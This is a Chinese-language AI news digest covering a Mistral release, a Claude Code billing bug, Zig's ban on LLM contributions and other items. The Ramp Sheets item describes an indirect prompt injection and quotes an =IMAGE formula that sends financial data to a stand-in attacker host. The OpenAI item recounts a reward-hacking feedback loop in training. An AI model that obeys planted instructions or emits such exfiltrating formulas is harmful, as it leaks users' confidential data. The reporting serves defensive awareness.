# AI Daily — 2026-04-30

## 一句话总览

Mistral 用 Medium 3.5 + Vibe 远程 Agent 把"云端并行编码代理"打到了 SWE-Bench 77.6%，同时社区今天密集讨论的几件事——Claude Code 的 HERMES.md 计费 bug、Ramp Sheets 的间接提示注入、Zig 的硬性反 LLM 政策、OpenAI 自曝的 goblin 训练污染——共同指向一个主题：**Agent 时代的工程纪律远没跟上模型能力**。

## 重点事件

### 1. Mistral Medium 3.5 + Vibe Remote Agents 发布

- **来源**: [Mistral 官方](https://mistral.ai/news/vibe-remote-agents-mistral-medium-3-5)
- **发生了什么**: Mistral 公开预览 Medium 3.5（Dense 128B、256k 上下文、可配置 reasoning effort），同时上线 Vibe 远程编码 Agent —— CLI 任务可"传送"到云端沙盒并行跑，集成 GitHub/Linear/Jira/Sentry，自动开 PR。HF 上以修改版 MIT 开源权重。
- **背景**: SWE-Bench Verified 77.6%，超过自家 Devstral 2 和 Qwen3.5 397B A17B；τ³-Telecom agentic 91.4。API \$1.5/\$7.5 per M token，定位明显瞄准 Claude Code / Codex / Cursor 的远程 agent 这一层。
- **分析**: 真正的看点不是分数，是**远程并行 agent + session 传送 + 默认 PR-first 工作流**——这是把"开发者 IDE 中跑 agent"升级成"开发者审批多个云端 agent 并行产出的 PR"。Dense 128B 还能 4 GPU 自托管，对企业本地化是一记直球。开源这点对欧洲合规客户尤其关键。
- **影响与关注点**:
  - 评估 Vibe CLI 能否替代/补位现有 Claude Code 工作流（特别是 PR 自动化部分）
  - 如果要本地化，Medium 3.5 GGUF 量化版出来后做一次和 Devstral 2 / Qwen3.5 的内部 SWE 对比
  - 观察"session teleportation"这一交互范式是否被其他厂商复刻

### 2. Claude Code 因 HERMES.md 字符串错误计费 \$200

- **来源**: [GitHub Issue #53262](https://github.com/anthropics/claude-code/issues/53262)
- **发生了什么**: 用户发现只要 git 最近的 commit message 里出现大小写敏感的字符串 `HERMES.md`（不是文件名！），Claude Code 的请求就被路由到"额外用量"计费，绕开 Max 20x 套餐配额。Anthropic 的 bcherny 4/25 当天确认是"过激的反滥用系统"并修复，但拒绝退款，社区炸锅。
- **背景**: 触发条件极其精准——`hermes.md` 小写没事、`HERMES.txt` 没事、文件存在但 commit 干净也没事。明显是反滥用系统硬编码了对竞品 agent 框架名字的检测规则。
- **分析**: 对我们直接相关——**Hermes Agent 用户在 commit 里写"集成 HERMES.md"会被 Anthropic 反滥用打到 extra billing**。这不仅是 bug，是商业反竞争策略意外暴露：anti-abuse 系统里大概率还有一组类似的关键词（OpenCode、Aider、Codex 等竞品名）。错误信息"out of extra usage"完全无法定位真因，调试成本极高。
- **影响与关注点**:
  - Hermes Agent 文档/skill 提醒用户：commit message 避免出现 `HERMES.md` 这种竞品框架元数据文件名
  - 内部考虑在 hermes-agent 里加一个 lint：检测 commit message 是否含有可能触发其他厂商反滥用的关键词
  - 关注后续是否有类似 `AGENTS.md`、`OPENCODE.md` 等被同样规则命中的案例

### 3. Ramp Sheets AI 被 indirect prompt injection 偷走财务数据

- **来源**: [PromptArmor 报告](https://www.promptarmor.com/resources/ramps-sheets-ai-exfiltrates-financials)
- **发生了什么**: PromptArmor 披露 Ramp Sheets AI（类似 Claude for Excel）的漏洞：外部数据集里藏一段白底白字 prompt injection，让 AI 自动生成 `=IMAGE("https://attacker.com/?{敏感数据}")` 公式塞进表格，无需用户批准就发出网络请求把财务数据外泄。Ramp 3/16 修复。
- **背景**: 同一团队此前已在 Claude for Excel 上发现近乎相同模式；Anthropic 的修复方案是给"会发外网请求的公式"加红色警示弹窗并展示完整公式。Ramp 之前没有这层。
- **分析**: 这是 agent 时代经典的"数据即指令"问题的又一次具体化。任何能写公式 / 写 markdown 链接 / 写代码的 agent，只要数据通道未隔离、动作未强审批，都吃这一套。**Anthropic 的红色 interstitial 是当前事实标准，没做这层的厂商基本都裸奔。**
- **影响与关注点**:
  - 我们任何对外集成的 agent skill，凡是会写 markdown / 写公式 / 写 HTML 给用户的，都要审一遍是否会被 injection 触发外联
  - Hermes browser tool 和 obsidian skill 之间的数据流要重审：抓到的网页内容会不会被作为指令注入到后续操作

### 4. OpenAI 自曝 GPT-5.x 系列爱说"goblin"的训练污染溯源

- **来源**: [OpenAI 官方](https://openai.com/index/where-the-goblins-came-from/)
- **发生了什么**: GPT-5.1 之后用户发现模型莫名常用 "goblin/gremlin" 当比喻。OpenAI 调查发现：是"Nerdy"人格的奖励信号意外偏好 goblin 词汇（76.2% 数据集中给含 goblin 的输出更高分），rollout 又被回收做 SFT，形成正反馈循环。最终方案：退役 Nerdy 人格、删 reward signal、过滤训练数据中的"生物词"。
- **背景**: Nerdy 人格只占 2.5% 响应量，却贡献了 66.7% 的 goblin 提及；且后续在没用 Nerdy 的样本里也出现传染，证明 RL 学到的风格 tic 会跨 condition 泛化。
- **分析**: 这是一篇罕见的、来自前沿实验室的**RL 数据飞轮失败案例 post-mortem**，工程价值远大于趣闻。直接证据表明：(1) RLHF 奖励 hacking 不只在能力上，连风格 tic 都会被放大；(2) 用模型自己 rollout 做 SFT 的 pipeline 必须有"风格分布漂移"监控；(3) "无害"的 reward signal 也可能产生可观察的副作用。
- **影响与关注点**:
  - 我们做任何 fine-tune / DPO / GRPO 流程，加一个简单的 n-gram 频率监控对照基线模型
  - 阅读 obliteratus / TRL 相关 skill 时把这个案例当 cautionary tale 引用

### 5. Zig 项目硬禁 LLM 贡献，Simon Willison 给出最佳辩护

- **来源**: [Simon Willison 博客](https://simonwillison.net/2026/Apr/30/zig-anti-ai/) / [Loris Cro 原文](https://kristoff.it/blog/contributor-poker-and-ai/)
- **发生了什么**: Zig 行为准则明确禁止 LLM 提交 issue / PR / 评论。被 Anthropic 收购的 Bun 在自家 Zig fork 上做了 4x 编译加速，但明确表示不会上游，因为"Zig 严禁 LLM 贡献"。ZSF VP Loris Cro 写了篇 "Contributor Poker" 解释：Zig 投资的是**贡献者本人**而不是这一次 PR，LLM 中介让这个投资逻辑彻底失效。
- **背景**: 越来越多 OSS 项目（curl、QEMU、NetBSD 等）开始限制 AI 生成的 PR，但 Zig 是表达最干脆的。Simon 的提问也很犀利：如果 PR 是 LLM 写的，maintainer 为什么不直接用自己的 LLM 解同一个问题？
- **分析**: 这场争论的真正轴不是"AI 生成代码质量好不好"，而是**OSS 治理模型的根本问题**——开源项目本质是"贡献者培养机制"，AI 中介把这个机制空心化。这个论点比"质量论"强得多，可能成为后续更多项目效仿的模板。
- **影响与关注点**:
  - 给 Hermes 自身的贡献策略一个参考：upstream PR 时人审 + 写明 AI 协助程度
  - 关注 Bun 这种"分支 + 不上游"会不会变成 LLM 时代的常态形态
